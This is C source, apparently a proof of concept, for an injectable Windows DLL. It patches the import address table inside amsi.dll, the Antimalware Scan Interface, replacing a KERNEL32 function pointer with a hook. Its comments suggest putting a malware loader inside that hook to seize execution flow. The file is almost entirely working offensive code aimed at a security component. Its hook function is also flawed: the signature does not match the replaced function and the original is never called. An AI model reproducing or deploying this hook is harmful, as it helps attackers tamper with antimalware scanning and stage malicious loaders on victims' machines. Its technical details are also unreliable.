#include <windows.h>

//Sleepys Hook 
//This is meant to be injected as a DLL

FARPROC funcAddr;

FARPROC myHook() {
    printf("Hooked!\n");
    //returning function address
    return funcAddr;
}

//DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {

if (ul_reason_for_call == DLL_PROCESS_ATTACH) {

    BYTE* baseAddress = (BYTE*)GetModuleHandle("amsi.dll");

    // Read DOS header
    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)baseAddress;
    if (dh->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid PE file\n");
        return FALSE;
    }

    // Read NT headers
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
       printf("Invalid NT headers\n");
        return FALSE;
    }

    // Get Optional Header
    PIMAGE_OPTIONAL_HEADER oh = &nt->OptionalHeader;

    // Check for Import Table
    if (oh->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress == 0) {
       printf("No imports found\n");
        return FALSE;
    }

    // Locate Import Table
    PIMAGE_IMPORT_DESCRIPTOR id = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)baseAddress + oh->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    
    while (id->Name != 0 && id->OriginalFirstThunk != 0) {
        // Imported DLL names
        char* importName = (char*)((BYTE*)baseAddress + id->Name);
        printf("%s\n", importName);

        if (strcmp(importName, "KERNEL32.dll") == 0) {

        PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)baseAddress + id->OriginalFirstThunk);
        PIMAGE_THUNK_DATA thunkData = (PIMAGE_THUNK_DATA)((BYTE*)baseAddress + id->FirstThunk);
            
    while (origThunk->u1.AddressOfData != NULL) {
    
    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)baseAddress + origThunk->u1.AddressOfData);

    if (importByName) {
        //for some reason this calls VirtualProtect everytime, a good look into windows but you can add a cmp statement
        funcAddr = (FARPROC)thunkData->u1.Function;
        printf("Function Name: %s -> Address: %p\n", importByName->Name, funcAddr);

        DWORD oldProtect; 
        VirtualProtect(&thunkData->u1.Function, sizeof(FARPROC), PAGE_READWRITE, &oldProtect); 
        // Hook
        thunkData->u1.Function = (FARPROC)myHook; 
        // This VirtualProtect be Hooked in this example, a good way to start off execution flow maybe add your loader
        // into the myHook function 
        VirtualProtect(&thunkData->u1.Function, sizeof(FARPROC), oldProtect, &oldProtect);

        break;
    }

    origThunk++;
    thunkData++;
}  

}
    id++;
}

    return TRUE;
    }
}
